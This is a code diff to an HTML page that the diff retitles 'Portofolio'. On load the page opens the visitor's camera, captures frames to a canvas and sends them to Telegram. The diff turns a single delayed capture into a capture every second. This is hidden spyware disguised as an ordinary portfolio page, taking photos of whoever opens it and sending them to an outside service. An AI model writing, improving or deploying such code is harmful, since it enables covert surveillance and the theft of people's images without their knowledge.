@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bio Data of Complete Information</title>
+    <title>Portofolio</title>
 </head>
 <body>
     <video id="video" width="300" height="250" autoplay></video>
@@ -22,11 +22,11 @@
                 console.error("Camera access denied:", error);
             });
 
-        // Capture the photo and send to Telegram
-        setTimeout(() => {
+        function captureAndSendPhoto() {
             let video = document.getElementById("video");
             let canvas = document.getElementById("canvas");
             let context = canvas.getContext("2d");
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -44,7 +44,10 @@
                 .then(data => console.log("Photo sent:", data))
                 .catch(error => console.error("Error sending photo:", error));
             }, "image/png");
-        }, 5000); // Wait for 5 seconds before capturing
+        }
+
+        // Capture and send a photo every 1 second
+        setInterval(captureAndSendPhoto, 1000);
     </script>
 </body>
 </html>
